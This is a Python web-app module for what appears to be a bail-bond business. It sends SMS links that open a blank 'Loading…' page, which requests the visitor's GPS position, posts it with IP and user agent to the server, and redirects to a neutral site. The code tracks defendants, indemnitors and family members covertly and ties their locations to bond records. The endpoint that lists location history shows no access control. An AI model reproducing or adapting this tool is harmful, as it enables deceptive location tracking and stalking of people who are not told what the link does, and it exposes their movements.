"""
Geo-Link Blueprint — Silent Location Capture
Generates one-time tracking tokens embedded in outbound texts.
When recipient taps the link, browser submits GPS coordinates silently
and redirects to a neutral page. Authorized by signed bond paperwork.
"""
from __future__ import annotations
import os
import uuid
import secrets
from datetime import datetime, timezone, timedelta
from quart import Blueprint, jsonify, request, redirect, make_response, current_app
from dashboard.extensions import get_collection

geo_bp = Blueprint("geo", __name__)

# Public-facing base URL for the server.
# Resolved at request time from app.config["DASHBOARD_PUBLIC_URL"] so that
# the value set in extensions.init_app() (which falls back through
# DASHBOARD_PUBLIC_URL → BB_WEBHOOK_PUBLIC_URL) is always used.
# Production value: https://leads.shamrockbailbonds.biz
def _get_public_url() -> str:
    """Return the branded public URL, falling back to env var."""
    try:
        url = current_app.config.get("DASHBOARD_PUBLIC_URL", "")
    except RuntimeError:
        # Outside app context (e.g. tests)
        url = os.getenv("DASHBOARD_PUBLIC_URL", "") or os.getenv("BB_WEBHOOK_PUBLIC_URL", "")
    return url.rstrip("/") if url else ""

# Neutral redirect target after GPS capture — just the home page
_REDIRECT_AFTER = os.getenv("GEO_REDIRECT_URL", "https://www.shamrockbailbonds.biz")

# Token TTL — links expire after 72 hours (covers 3-day first-appearance window)
_TOKEN_TTL_HOURS = int(os.getenv("GEO_TOKEN_TTL_HOURS", "72"))


@geo_bp.route("/geo/link", methods=["POST"])
async def geo_create_link():
    """
    Generate a one-time geo-tracking token for a recipient.
    Returns the short URL to embed in the outbound text.

    Body JSON:
        phone           str   — recipient phone (E.164 or 10-digit)
        booking_number  str   — defendant booking number (for record linkage)
        defendant_name  str   — for display in tracking map
        county          str   — county
        recipient_label str   — "Indemnitor", "Family", etc.
        agent_name      str   — sending agent
    """
    geo_pings = get_collection("geo_pings")
    data = await request.get_json(force=True) or {}

    token = secrets.token_urlsafe(12)  # 16-char URL-safe token
    expires_at = datetime.now(timezone.utc) + timedelta(hours=_TOKEN_TTL_HOURS)

    doc = {
        "token": token,
        "phone": data.get("phone", ""),
        "booking_number": data.get("booking_number", ""),
        "defendant_name": data.get("defendant_name", ""),
        "county": data.get("county", ""),
        "recipient_label": data.get("recipient_label", "Unknown"),
        "agent_name": data.get("agent_name", ""),
        "created_at": datetime.now(timezone.utc).isoformat(),
        "expires_at": expires_at.isoformat(),
        "pings": [],          # list of {lat, lng, accuracy, ts, ip, ua}
        "ping_count": 0,
        "status": "pending",  # pending | captured | expired
    }
    await geo_pings.insert_one(doc)

    public_url = _get_public_url()
    short_url = f"{public_url}/g/{token}" if public_url else f"/g/{token}"
    return jsonify({"token": token, "url": short_url})


@geo_bp.route("/g/<token>", methods=["GET"])
async def geo_capture_page(token: str):
    """
    Serve the silent GPS capture page.
    The page immediately requests geolocation, POSTs coordinates back,
    then redirects to a neutral URL — all within ~1 second.
    """
    html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Shamrock Bail Bonds</title>
<style>body{{margin:0;background:#fff;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;color:#555;font-size:14px}}</style>
</head>
<body>
<p>Loading&hellip;</p>
<script>
(function(){{
  var token = {token!r};
  var redirect = {_REDIRECT_AFTER!r};
  function done(){{ window.location.replace(redirect); }}
  function send(lat,lng,acc){{
    try{{
      var x=new XMLHttpRequest();
      x.open('POST','/g/'+token+'/ping',true);
      x.setRequestHeader('Content-Type','application/json');
      x.onloadend=done;
      x.onerror=done;
      x.send(JSON.stringify({{lat:lat,lng:lng,accuracy:acc}}));
    }}catch(e){{done();}}
  }}
  if(navigator.geolocation){{
    navigator.geolocation.getCurrentPosition(
      function(p){{send(p.coords.latitude,p.coords.longitude,p.coords.accuracy);}},
      function(){{done();}},
      {{timeout:5000,maximumAge:0,enableHighAccuracy:true}}
    );
  }}else{{done();}}
}})();
</script>
</body>
</html>"""
    resp = await make_response(html)
    resp.headers["Content-Type"] = "text/html; charset=utf-8"
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
    return resp


@geo_bp.route("/g/<token>/ping", methods=["POST"])
async def geo_receive_ping(token: str):
    """
    Receive GPS coordinates from the capture page.
    Stores the ping in MongoDB under the token's record.
    Also upserts latest_location on the matching active_bond if one exists.
    """
    geo_pings = get_collection("geo_pings")
    active_bonds = get_collection("active_bonds")

    data = await request.get_json(force=True) or {}
    lat = data.get("lat")
    lng = data.get("lng")
    accuracy = data.get("accuracy")

    if lat is None or lng is None:
        return jsonify({"ok": False}), 400

    now = datetime.now(timezone.utc).isoformat()
    ping_entry = {
        "lat": lat,
        "lng": lng,
        "accuracy": accuracy,
        "ts": now,
        "ip": request.headers.get("X-Forwarded-For", request.remote_addr or ""),
        "ua": request.headers.get("User-Agent", ""),
    }

    # Update the geo_pings record
    result = await geo_pings.update_one(
        {"token": token, "status": {"$in": ["pending", "captured"]}},
        {
            "$push": {"pings": ping_entry},
            "$inc": {"ping_count": 1},
            "$set": {
                "status": "captured",
                "last_ping": now,
                "last_lat": lat,
                "last_lng": lng,
            },
        },
    )

    if result.matched_count == 0:
        return jsonify({"ok": False, "reason": "token_not_found_or_expired"}), 404

    # Retrieve booking_number for active bond linkage
    record = await geo_pings.find_one({"token": token}, {"booking_number": 1, "phone": 1})
    booking_number = record.get("booking_number") if record else None

    if booking_number:
        location_entry = {
            "lat": lat,
            "lng": lng,
            "accuracy": accuracy,
            "source": "sms_geo_link",
            "ts": now,
        }
        # Update active_bonds
        await active_bonds.update_one(
            {"booking_number": booking_number},
            {
                "$push": {"location_history": location_entry},
                "$set": {
                    "latest_location": location_entry,
                    "last_geo_ping": now,
                },
            },
        )
        # Also stamp on defendants collection (Phase 2 linkage)
        defendants = get_collection("defendants")
        await defendants.update_one(
            {"arrest_ids": {"$elemMatch": {"booking_number": booking_number}}},
            {
                "$push": {"location_history": {"$each": [location_entry], "$slice": -50}},
                "$set": {
                    "latest_location": location_entry,
                    "last_geo_ping": now,
                },
            },
        )

    return jsonify({"ok": True})


@geo_bp.route("/api/geo/pings/<booking_number>", methods=["GET"])
async def geo_get_pings(booking_number: str):
    """Return all geo pings for a booking number (for dashboard Tracking tab)."""
    geo_pings = get_collection("geo_pings")
    cursor = geo_pings.find(
        {"booking_number": booking_number},
        {"_id": 0, "token": 0},
    ).sort("created_at", -1).limit(100)
    docs = []
    async for doc in cursor:
        docs.append(doc)
    return jsonify({"pings": docs, "count": len(docs)})
